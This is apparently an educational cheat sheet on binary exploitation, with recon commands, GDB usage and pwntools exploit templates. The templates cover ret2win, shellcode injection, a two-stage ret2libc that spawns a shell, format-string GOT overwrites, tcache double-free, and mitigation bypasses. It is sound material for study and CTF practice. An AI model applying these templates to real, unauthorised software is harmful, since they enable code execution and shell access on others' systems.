# 💥 Binary Exploitation & Exploit Development

> Break binaries, take control of execution. Start with the basics and work up to heap kung-fu.

> **Grey Hat context:** Binary exploitation is at the heart of vulnerability research, zero-day discovery, and exploit development. These skills are used in both offensive security research and in understanding real-world CVEs for defensive purposes.

---

## Prerequisites

- Comfortable with C / assembly (x86-64)
- Know how the stack works
- Can use GDB

---

## Recon: Understand the Binary First

```bash
# Check protections
checksec --file=binary

# Key protections:
# RELRO     - protects GOT from overwrites (Partial < Full)
# Stack Canary - stack cookie before return address
# NX / DEP  - non-executable stack (no shellcode on stack)
# PIE       - Position Independent Executable (randomized base)
# ASLR      - Address Space Layout Randomization (OS-level)

# Identify architecture and file type
file binary

# Find interesting strings
strings binary | grep -i flag
strings binary | grep -i pass

# Check linked libraries
ldd binary

# Disassemble main
objdump -d binary | grep -A 40 "<main>:"
```

---

## GDB + pwndbg Cheatsheet

```bash
# Start
gdb ./binary
gdb -q ./binary          # quiet mode

# pwndbg key commands
start                    # run and stop at main
run < input.txt          # run with input
break *0x401234          # breakpoint at address
break main               # breakpoint at function
continue                 # continue execution
next / ni                # next instruction (step over)
step / si                # step into
finish                   # run until end of function

info registers           # show all registers
x/10gx $rsp              # examine 10 64-bit words at RSP
x/s 0x402000             # examine string at address
stack 20                 # show 20 stack entries (pwndbg)
vmmap                    # memory map (pwndbg)
got                      # GOT table (pwndbg)
```

---

## Stack Buffer Overflow

### Find the Offset
```python
# Generate cyclic pattern
from pwn import *
print(cyclic(200))

# After crash, find offset
cyclic_find(0x61616175)   # value from $rip/$rbp after crash
```

### Classic Ret2Win (no ASLR, NX)
```python
from pwn import *

p = process('./binary')
win = p64(0x401234)   # address of win() function

payload = b'A' * offset     # fill buffer + saved rbp
payload += win

p.sendline(payload)
p.interactive()
```

### Ret2Shellcode (NX off)
```python
from pwn import *

p = process('./binary')
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
buf_addr = 0x...  # leak or known address of buffer

payload = shellcode.ljust(offset, b'\x90')
payload += p64(buf_addr)

p.sendline(payload)
p.interactive()
```

---

## Return-Oriented Programming (ROP)

Used when NX is enabled (can't execute shellcode on stack).

```bash
# Find gadgets
ROPgadget --binary binary
ROPgadget --binary binary --rop

# Useful gadgets
# pop rdi ; ret     → set first argument
# pop rsi ; ret     → set second argument
# pop rdx ; ret     → set third argument
# ret               → stack alignment (needed for movaps in libc)
```

### Ret2Libc (leak libc base, call system("/bin/sh"))
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = process('./binary')

# --- Stage 1: Leak libc address ---
pop_rdi = 0x...         # pop rdi ; ret gadget
ret     = 0x...         # ret gadget (stack alignment)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main    = elf.sym['main']

payload  = b'A' * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)     # return to main for stage 2

p.sendline(payload)
p.recvline()             # absorb any output before leak

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
log.info(f"libc base: {hex(libc.address)}")

# --- Stage 2: Call system("/bin/sh") ---
system   = libc.sym['system']
bin_sh   = next(libc.search(b'/bin/sh'))

payload2  = b'A' * offset
payload2 += p64(ret)      # alignment
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.sendline(payload2)
p.interactive()
```

---

## Format String Vulnerabilities

Triggered when user input is passed directly to `printf` / `fprintf`.

```c
printf(user_input);   // vulnerable
printf("%s", user_input);  // safe
```

### Leak Memory
```python
# Send %p.%p.%p... to read values off the stack
payload = b'%p.' * 20

# Find which argument holds your buffer (direct parameter access)
payload = b'AAAA%1$p%2$p%3$p...'
# When you see 0x41414141, that's your buffer position
```

### Arbitrary Write (classic)
```python
from pwn import *

# Write address of win() to GOT entry of exit()
target_addr = elf.got['exit']
win_addr    = elf.sym['win']

# Use fmtstr_payload helper
payload = fmtstr_payload(offset, {target_addr: win_addr})
```

---

## Heap Exploitation Basics

### Key Concepts
- `malloc()` — allocate heap chunk
- `free()` — release chunk back to allocator
- **Use-after-free (UAF)** — access freed memory
- **Double free** — free the same chunk twice
- **Heap overflow** — overflow into adjacent chunk metadata

### Tcache (glibc >= 2.26)
```python
# Double free in tcache (pre-2.32 no checks)
# 1. malloc(0x20) → chunk_A
# 2. free(chunk_A)
# 3. free(chunk_A) again → chunk_A now in tcache twice
# 4. malloc(0x20) → get chunk_A back, write fake fd pointer
# 5. malloc(0x20) → get chunk_A again
# 6. malloc(0x20) → allocate at fake_fd (arbitrary address)
```

---

## Useful pwntools Snippets

```python
from pwn import *

# Context
context.arch    = 'amd64'  # or 'i386', 'arm'
context.os      = 'linux'
context.log_level = 'debug'  # show all I/O

# Connect
p = process('./binary')
p = remote('ctf.example.com', 1337)

# Sending / Receiving
p.sendline(b'hello')
p.send(b'hello\n')
p.recvline()
p.recvuntil(b'> ')
p.recvall()
p.interactive()

# Packing integers
p64(0xdeadbeef)   # 64-bit little-endian
p32(0xdeadbeef)   # 32-bit little-endian
u64(data[:8])     # unpack 64-bit

# ELF helpers
elf = ELF('./binary')
elf.sym['main']         # symbol address
elf.plt['puts']         # PLT entry
elf.got['puts']         # GOT entry

# Cyclic pattern
cyclic(200)
cyclic_find(0x61616175)
```

---

## Binary Mitigations — Quick Reference

| Mitigation | Bypass |
|---|---|
| NX | ROP / ret2libc |
| Stack Canary | Leak canary via format string or info leak |
| ASLR + PIE | Leak runtime address, compute base |
| Full RELRO | Can't overwrite GOT; use other write primitives |

---

## Resources

- [pwn.college](https://pwn.college) — structured binary exploitation curriculum
- [pwntools docs](https://docs.pwntools.com)
- [how2heap](https://github.com/shellphish/how2heap) — heap exploitation techniques
- [ROP Emporium](https://ropemporium.com) — ROP challenges by difficulty
- [ir0nstone's GitBook](https://ir0nstone.gitbook.io/notes/) — modern PWN notes
- [LiveOverflow YouTube](https://www.youtube.com/@LiveOverflow) — binary exploitation video series
